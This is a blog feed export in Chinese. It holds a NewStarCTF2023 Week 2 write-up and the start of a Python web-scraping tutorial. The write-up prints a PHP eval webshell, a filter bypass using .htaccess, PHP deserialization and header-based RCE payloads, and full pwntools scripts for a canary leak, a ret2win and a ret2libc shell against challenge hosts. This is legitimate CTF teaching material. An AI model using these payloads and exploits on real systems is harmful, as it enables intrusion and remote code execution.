title="image-20231002235008331"><p>成功执行</p><p>题目过滤了cat、tac、more、tail和base</p><p>如果flag文件没有干扰内容，那么看前几行足矣，这里使用<code>head</code>命令</p><p>先查看根目录<code>O:4:&quot;evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;</code>，找到flag文件<code>th1s_1s_fffflllll4444aaaggggg</code></p><img src="/posts/843a2f5ea22b/image-20231002235343802.png" class="" title="image-20231002235343802"><p>执行<code>O:4:&quot;evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:35:&quot;head /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></p><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231002235637114.png" class="" title="image-20231002235637114"><h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p>上传一个md为后缀，内容为<code>&lt;? eval($_POST[&#39;hack&#39;]) ?&gt;</code></p><p>发现会被拦截</p><p><img src="G:/CTF/CTF题目文件/NewStarCTF2023/WEEK2/img/image-20231002102443792.png" alt="image-20231002102443792"></p><p>猜测是对内容有过滤</p><p>尝试只传<code>&lt;? ?&gt;</code>，依旧不行</p><p>抓包发现php版本为<code>5.6.40</code>，考虑用html标签<code>&lt;script language=&quot;php&quot;&gt;</code></p><p>同时由于对文件格式有过滤，使用.htaccess绕过</p><img src="/posts/843a2f5ea22b/image-20231003200038535.png" class="" title="image-20231003200038535"><img src="/posts/843a2f5ea22b/image-20231003200111956.png" class="" title="image-20231003200111956"><p>成功上传后，用蚁剑连接</p><p>根目录下找到flag</p><img src="/posts/843a2f5ea22b/image-20231003200217224.png" class="" title="image-20231003200217224"><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p>页面中提到泄漏信息</p><p>脚本跑一遍备份文件泄漏测试，没有发现泄漏文件</p><p>考虑<code>.git</code>泄漏，使用githacker爬一遍</p><p>在<code>COMMIT_EDITMSG</code>中找到提交修改记录</p><img src="/posts/843a2f5ea22b/image-20231004135334895.png" class="" title="image-20231004135334895"><p>成功访问源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前一个正则表达式说明star传的参只能是形如<code>xx(xxx());</code></p><p>典型的<strong>无参RCE</strong></p><p>此时linux指令基本都失效了，只能考虑通过PHP代码来寻找flag</p><p>同时查看目录的readdir和scandir都被过滤了</p><p>查看环境变量的<code>get_defined_vars</code>也被禁用</p><p>考虑用<code>getallheaders</code>代替</p><p>发现User-Agent在数组的第二个，将值替换为我们想要执行的linux命令</p><img src="/posts/843a2f5ea22b/image-20231004170430321.png" class="" title="image-20231004170430321"><p>此时使用<strong>next()</strong>函数就能取到数组第二个</p><img src="/posts/843a2f5ea22b/image-20231004170518418.png" class="" title="image-20231004170518418"><p>我们将print_r替换成system便能执行在User-Agent处的命令</p><p>执行<code>cd /;cat flag</code>，得到flag</p><img src="/posts/843a2f5ea22b/image-20231004170706366.png" class="" title="image-20231004170706366"><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>checksec一下</p><img src="/posts/843a2f5ea22b/image-20231002153028196.png" class="" title="image-20231002153028196"><p>开了Canary</p><p>backdoor在<code>0x401266</code></p><p>canary与rbp相差8</p><p>buf与rbp相差0x30</p><p>则buf与canary相差40</p><img src="/posts/843a2f5ea22b/image-20231006214640028.png" class="" title="image-20231006214640028"><p>但由于第一次读的时候只读20个字节，想带出Canary行不通</p><p>考虑用格式化字符串</p><p>canary位于第$(40/8+6)=11$个字节</p><p>编写如下exp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">conn = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27555</span>)</span><br><span class="line"></span><br><span class="line">get_shell = <span class="number">0x00401262</span></span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&quot;Give me some gift?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak Canary</span></span><br><span class="line">payload = <span class="string">b&quot;%11$p&quot;</span></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.recvuntil(<span class="string">b&quot;Oh thanks,There is my gift:\n&quot;</span>)</span><br><span class="line">Canary = <span class="built_in">int</span>(conn.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bypass Canary</span></span><br><span class="line">conn.recvuntil(<span class="string">b&quot;magic\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">40</span>+p64(Canary)+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(get_shell)</span><br><span class="line">conn.send(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>成功getshell</p><img src="/posts/843a2f5ea22b/image-20231006234755233.png" class="" title="image-20231006234755233"><h3 id="secret-number"><a href="#secret-number" class="headerlink" title="secret number"></a>secret number</h3><p>和上周的题目相同的解法</p><p>使用python的<strong>ctypes库在本地模拟</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27679</span>)</span><br><span class="line">libc =cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">srand = libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;Give me some gift?(0/1)\n&#x27;</span>)</span><br><span class="line">conn.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;Guess the number\n&#x27;</span>)</span><br><span class="line">conn.sendline(<span class="built_in">str</span>(libc.rand()).encode())</span><br><span class="line">conn.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231007005628504.png" class="" title="image-20231007005628504"><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>checksec一下，没有开PIE和 canary保护</p><img src="/posts/843a2f5ea22b/image-20231007105731912.png" class="" title="image-20231007105731912"><p>IDA观察反编译源码，没有发现system和bin/bash</p><p>先测一下栈的大小，为40</p><img src="/posts/843a2f5ea22b/image-20231007155245672.png" class="" title="image-20231007155245672"><p>首先泄露一次got表中puts的地址</p><p>要注意这里在read函数之后还有一个puts输出，而栈溢出覆盖的是整个main函数的返回地址，需要等整个函数执行完</p><p>所以读取地址时要在接收到<code>&#39;time\n&#39;</code>之后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&#x27;ret2libc&#x27;</span>)</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = e.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(main_addr)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">rdi_addr=<span class="number">0x400763</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line">payload1=<span class="string">b&#x27;A&#x27;</span>*offset+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26857</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;again\n&quot;</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;time\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>接下来利用LibcSearcher库来搜寻libc版本，并通过偏移量将puts函数的地址覆盖为system和binsh的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + p64(rdi_addr) + p64(binsh) + p64(rdi_addr+<span class="number">1</span>) + p64(system) + p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;again\n&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>成功getshell</p><p><img src="G:/CTF/CTF题目文件/NewStarCTF2023/WEEK2/wp/image-20231008123523832.png" alt="image-20231008123523832"></p><p>buu</p>]]></content>
      
      
      <categories>
          
          <category> NewStarCTF2023 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python3 网络爬虫笔记</title>
      <link href="/posts/cd0d11b6cb14/"/>
      <url>/posts/cd0d11b6cb14/</url>
      
        <content type="html"><![CDATA[<p>最近这段时间将开始研究python在网络爬虫上的应用</p><p>既是大创结题项目的需求，同时也是为了拓宽自己的技术视野</p><p>本文作为<strong>学习笔记</strong>，同时也是编写爬虫程序过程中的<strong>经验总结</strong></p><p>希望本阶段学习能让我熟练掌握网络爬虫，以后能将其用作其他网络安全领域的工具延申</p><p>因为是初次入门网络爬虫，那么在编写爬虫应用程序之前，很有必要搞清楚网络爬虫的原理</p><h1 id="网络爬虫原理"><a href="#网络爬虫原理" class="headerlink" title="网络爬虫原理"></a>网络爬虫原理</h1><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><div class="note info flat"><p><strong>URI</strong>(Uniform Resource Identifier)：统一标识符</p><p><strong>URL</strong>(Uniform Resource Locator)：统一资源定位符</p><p>URI分为URL和URN或同时具备locators 和names特性的一个东西</p></div><p>网络世界中更常见的还是URL，也就是平时浏览器中输入的web地址</p><p>但是URL也有它的格式规范</p><p><code>scheme://[username:password@]hostname[:port][/path][;parameters][?query][#fragment]</code></p><p>这里解释几个计网课上没有学到的概念</p><p><strong>scheme(protocol)</strong>：协议，例如http、https、ftp等</p><p><strong>username:password</strong>：当URL需要用户名和密码才能访问时，可以将他们放在hostname前</p><p><strong>parameters</strong>：参数，有时候我们需要向解析url的应用程序提供参数才能去访问资源，因为参数可能会定义传输格式</p><p><strong>fragment</strong>：片段，有前端知识的同学应该对这个概念不陌生。片段可以作为单页面路由或HTML锚点，当你访问<code>#锚点名</code>时页面能够直接滚动到特定锚点的位置</p><h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><p>在计算机网络的相关协议中，网络爬虫主要涉及到的是应用层协议，如HTTP和HTTPS</p><p>虽然我们在爬虫时更关心的是响应体中返回的页面内容，但只有正确设置请求报文，才能让目标服务器对我们做出回应</p><p><strong>请求头</strong>中比较重要的信息有以下几种</p><p><strong>User-Agent</strong>：该请求头能向目标服务器说明客户端使用的操作系统、浏览器版本等信息。爬虫时加速该请求头可以让我们的爬虫程序伪装成浏览器。</p><p><strong>Referer</strong>：标识该请求从那个页面发送过来，我们可以对该信息进行伪造来欺骗目标服务器</p><p>而响应头中也有一些重要信息</p><p><strong>Last-Modified</strong>：用于指定资源的最后修改时间</p><p><strong>Content-Encoding</strong>：用于指定响应内容的编码</p><p><strong>Content-Type</strong>：文档类型，指定返回的数据是什么类型。例如text/html代表返回的是HTML文档，application/x-javascript代表返回JavaScript文件，image/jpeg代表返回图片</p><p><strong>Set-Cookie</strong>：用于告诉浏览器需要将此内容放在Cookie中，下次请求时将Cookie带上</p><p>而响应体中的源代码和JSON数据则是我们需要爬取的内容</p><h2 id="HTML-DOM树"><a href="#HTML-DOM树" class="headerlink" title="HTML DOM树"></a>HTML DOM树</h2><p>在HTML中，所有标签定义的内容都是节点，这些节点构成了HTML DOM树</p><div class="note info flat"><p><strong>DOM(Document Object Model)</strong>，即文档对象模型，定义了访问HTML和XML文档的标准</p></div><p>html标签为一个根节点，而整个网站文档则是一个文档节点</p><p>节点中的文本时文本节点，节点中的属性是属性节点。同时，文档中的注释也对应一个注释节点。</p><p>节点树中的所有节点均可通过HTML DOM被JS访问、修改、创建和删除</p><p>节点之间会有父子和兄弟关系</p><h2 id="XPath"><a href="#XPath" class="headerlink" title="XPath"></a>XPath</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><div class="note info flat"><p><strong>XPath</strong>即为XML路径语言（XML Path Language），它是一种用来确定XML文档中某部分位置的语言。</p></div><p>XML或HTML 文档是被作为节点树来对待的</p><p>页面中的所有元素基本都是节点，当然除节点外也有基本值</p><p>基本值是无父或无子的节点，例如文本或者是属性对应的值</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>XPath 使用路径表达式来选取 XML 文档中的节点或节点集。节点是通过沿着路径 (path) 或者步 (steps) 来选取的。</p><p>XPath的常用表达式规则如下</p><div class="table-container"><table><thead><tr><th style="text-align:center">表达式</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">nodename</td><td style="text-align:center">选取此节点的所有子节点</td></tr><tr><td style="text-align:center">/</td><td style="text-align:center">从当前节点选取直接子节点</td></tr><tr><td style="text-align:center">//</td><td style="text-align:center">从当前节点选取子孙节点</td></tr><tr><td style="text-align:center">.</td><td style="text-align:center">选取当前节点</td></tr><tr><td style="text-align:center">..</td><td style="text-align:center">选取当前节点的父节点</td></tr><tr><td style="text-align:center">@</td><td style="text-align:center">选取属性</td></tr></tbody></table></div><p>这个表示和电脑文件系统中的路径表示非常相似</p><p>当然XPath中也有谓语、通配符和运算符的存在</p><p><strong>谓语</strong>即方括号，和数组索引非常相似</p><p><code>//div[1]</code>：选取所有div元素中的第一个元素</p><p><code>//div[last()]</code>：选取所有div元素中的最后一个元素元素</p><p><code>//title[@lang=&#39;eng&#39;]</code>： 选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性</p><p><strong>通配符</strong>有*和node()</p><p><code>*</code>和<code>node()</code>用于匹配任何元素节点，<code>@*</code>用于匹配任何属性节点</p><p>较为常用的<strong>运算符</strong>便是<code>|</code>和<code>and</code></p><p><code>|</code>用于合并两个节点集，而<code>and</code>则能用于多属性匹配</p><p><code>//book | //cd</code>  返回所有拥有 book 和 cd 元素的节点集 </p><p>谓语中的多个属性条件间可以使用and来连接</p><p>通过几个复杂表达式我们可以更清晰地理解XPath</p><h3 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h3><p>当我们想使用XPath选择页面中的某个节点时，如果页面层次结构太过复杂，往往很难定位</p><p>在实际编写爬虫时，获取XPath表达式的最佳途径是从<strong>浏览器控制台的元素界面</strong>获取</p><p>以edge浏览器为例，右键元素中某一节点可以将其xpath表达式导出</p><img src="/posts/cd0d11b6cb14/image-20231013001532571.png" class="" title="image-20231013001532571"><h2 id="爬虫流程"><a href="#爬虫流程" class="headerlink" title="爬虫流程"></a>爬虫流程</h2><p>一个爬虫程序的流程分为获取网页、提取信息和保存数据</p><p><strong>获取网页</strong></p><p>该步骤的关键是构造一个请求并发送给服务器，然后接收到响应并对其进行解析</p><p>实现方法便是python中的众多HTTP 请求库，如<strong>urlib</strong>和<strong>requests</strong>，在编写ctf的web题目脚本时就经常会用到，算得上是老熟人了🤣</p><p><strong>提取信息</strong></p><p>获得源代码后，就需要从中间提取我们想要的数据</p><p>我们可以通过正则表达式进行匹配，也可以利用网页节点属性、CSS选择器或者XPath来提取网页信息</p><p>涉及到的库有<strong>Beautiful Soup</strong>、<strong>pyquery</strong>、<strong>lxml</strong>等</p><p><strong>保存数据</strong></p><p>一般在项目中，爬虫爬取的数据会被保存到数据库中</p><p>所以我们也需要掌握一定的数据库知识</p><h2 id="非常规HTML代码"><a href="#非常规HTML代码" class="headerlink" title="非常规HTML代码"></a>非常规HTML代码</h2><p>有时候网页返回的可能是<strong>JSON字符串或者二进制数据</strong>，我们可以将其解析、转换成相应的目标文件格式</p><p>当然也可能遇到源代码非常简略，页面信息并不在HTML代码中，而是靠<strong>JavaScript渲染</strong>的情况</p><p>此时需要我们抓取JS文件，并在本地使用一些库进行<strong>模拟渲染</strong></p><h1 id="相关库的基础用法"><a href="#相关库的基础用法" class="headerlink" title="相关库的基础用法"></a>相关库的基础用法</h1><h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><p>由于requests，是对urllib的再次封装，即urllib的升级版，所以直接学习requests即可</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><code>pip3 install requests</code></p><h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><p>request库中最核心的便是请求方法</p><div class="table-container"><table><thead><tr><th style="text-align:left">方法</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">delete(<em>url</em>, <em>args</em>)</td><td style="text-align:left">发送 DELETE 请求到指定 url</td></tr><tr><td style="text-align:left">get(<em>url</em>, <em>params, args</em>)</td><td style="text-align:left">发送 GET 请求到指定 url</td></tr><tr><td style="text-align:left">head(<em>url</em>, <em>args</em>)</td><td style="text-align:left">发送 HEAD 请求到指定 url</td></tr><tr><td style="text-align:left">patch(<em>url</em>, <em>data, args</em>)</td><td style="text-align:left">发送 PATCH 请求到指定 url</td></tr><tr><td style="text-align:left">post(<em>url</em>, <em>data, json, args</em>)</td><td style="text-align:left">发送 POST 请求到指定 url</td></tr><tr><td style="text-align:left">put(<em>url</em>, <em>data, args</em>)</td><td style="text-align:left">发送 PUT 请求到指定 url</td></tr></tbody></table></div><p>而这些请求方法的返回对象即为页面的响应信息</p><p>我们可以用一个变量来接收返回对象</p><p><code>r = requests.get(&#39;https://rickliu.com&#39;)</code></p><p>而请求方法中的各种<strong>参数</strong>则可以用来完善发送的请求报文</p><h4 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h4><p><strong>Get请求</strong>中传递的URL参数可以通过函数中的关键字参数<strong>params</strong>实现</p><p>下面是get请求传递数据较为标准的格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;rickliu&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;key&#x27;</span>:<span class="number">1024</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://rickliu.com&#x27;</span>,params=data)</span><br></pre></td></tr></table></figure><p>该方法与直接在url中添加url参数的效果相同</p><p>等价于<code>r = requests.get(&#39;http://rickliu.com?name=rickliu&amp;key=1024&#39;)</code></p><p><strong>Post请求</strong>如果需要传递表单数据，则是通过关键字参数<strong>data</strong></p><p>我们可以向data传入字符串、字典或者元组，分别对应不同的Post请求需求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 网页中常见的表单可以通过传递字典给data，字典中的键值对会被自动编码成表单形式</span></span><br><span class="line">payload = &#123;</span><br><span class="line"><span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;rickliu&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;key&#x27;</span>:<span class="number">1024</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 当表单的name属性为数组，我们可以通过将元组传递给data来向同一个键传多个值</span></span><br><span class="line">payload = ((<span class="string">&#x27;key&#x27;</span>,<span class="number">1024</span>),(<span class="string">&#x27;key&#x27;</span>,<span class="number">2048</span>),(<span class="string">&#x27;key&#x27;</span>,<span class="number">4096</span>))</span><br><span class="line"><span class="comment"># 如果payload为字符串，则会直接传递而不会被编码</span></span><br><span class="line">payload = <span class="string">&#x27;where is flag&#x27;</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://rickliu.com&#x27;</span>,data=payload)</span><br></pre></td></tr></table></figure><p>当然，如果页面限制接收json格式的内容，特征为响应头中<code>Content-Type:application/json</code>，那么post传递的数据也可以传给关键词参数<strong>json</strong>，传递的数据会被自动编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line"><span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;rickliu&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;key&#x27;</span>:<span class="number">1024</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://rickliu.com&#x27;</span>,json=payload)</span><br></pre></td></tr></table></figure><div class="note warning flat"><p>实际场景中，我们选用json或者data，则需要通过对页面抓包查看<strong>Content-Type</strong>响应头的值来决定</p></div><h4 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h4><p>通过给关键词参数<strong>headers</strong>传字典，我们可以定义一些请求头的值</p><p>字典中的键值对对应不同的请求头和值</p><p>用法示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;flag&#x27;</span>:<span class="string">&#x27;flag&#123;R1ck&#125;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://rickliu.com&#x27;</span>,headers=headers)</span><br></pre></td></tr></table></figure><h4 id="超时时间"><a href="#超时时间" class="headerlink" title="超时时间"></a>超时时间</h4><p>超时时间是用来防止服务器响应太慢而等待太长时间</p><p>毕竟爬虫的吞吐量还是很大的，如果等待太久会增加很大的时间开销</p><p>关键词参数<strong>timeout</strong>即为超时时间设置</p><p>我们可以给请求的连接和读取阶段3分别设置超时时间，或者直接设定总的超时时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置总的超时时间</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://rickliu.com&#x27;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line"><span class="comment"># 连接和读取分别设置为1秒和5秒</span></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://rickliu.com&#x27;</span>,timeout=(<span class="number">1</span>,<span class="number">5</span>)))</span><br></pre></td></tr></table></figure><h3 id="返回对象"><a href="#返回对象" class="headerlink" title="返回对象"></a>返回对象</h3><p>请求方法的返回为一个Response对象</p><p>该对象的属性包含许多响应体的信息</p><p>下面是一些常用属性</p><p><strong>status_code</strong>：响应状态码</p><p><strong>encoding</strong>：响应头部字符编码</p><p><strong>headers</strong>：响应头</p><p><strong>cookies</strong>：cookies信息</p><p><strong>text</strong>：响应体内容（str类型）</p><p><strong>history</strong>：请求历史</p><h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p><code>pip3 install lxml</code></p><h3 id="etree"><a href="#etree" class="headerlink" title="etree"></a>etree</h3><p>而在进行解析前，可以先使用etree.HTML对HTML文本进行初始化</p><p>在初始化过程中，会自动对HTML文本修正，例如补全标签的闭合，并自动添加body、html节点</p><p>lxml一般通过XPath来对页面中的元素进行选择</p><p>调用xpath方法即可进行数据提取，函数中的参数即为XPath表达式</p><p>例如我想获取我的博客下头像的图床链接，层次结构如下</p><img src="/posts/cd0d11b6cb14/image-20231013000728867.png" class="" title="image-20231013000728867"><p>我们可以用如下爬虫程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;https://rickliu.com&#x27;</span>)</span><br><span class="line">html = etree.HTML(r.text)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//*[@id=&quot;sidebar-menus&quot;]/div[1]/img/@src&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><h2 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h2><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><p>Beautiful在解析时依赖解析器，它除了支持Python标准库中的HTML解析器外，还支持一些第三方库（比如lxml）</p><p>所以在安装时需要一并将解析器安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install bs4</span><br><span class="line">pip install lxml</span><br></pre></td></tr></table></figure><h3 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h3><p>以下为Beautiful Soup 支持的部分解析器</p><div class="table-container"><table><thead><tr><th style="text-align:center">解析器</th><th style="text-align:center">使用方法</th><th style="text-align:center">优势</th><th style="text-align:center">劣势</th></tr></thead><tbody><tr><td style="text-align:center">Python标准库</td><td style="text-align:center">BeautifulSoup(markup, ‘html.parser’)</td><td style="text-align:center">python内置的标准库，执行速度适中</td><td style="text-align:center">Python3.2.2之前的版本容错能力差</td></tr><tr><td style="text-align:center">lxml HTML解析器</td><td style="text-align:center">BeautifulSoup(markup, ‘lxml’)</td><td style="text-align:center">速度快、文档容错能力强</td><td 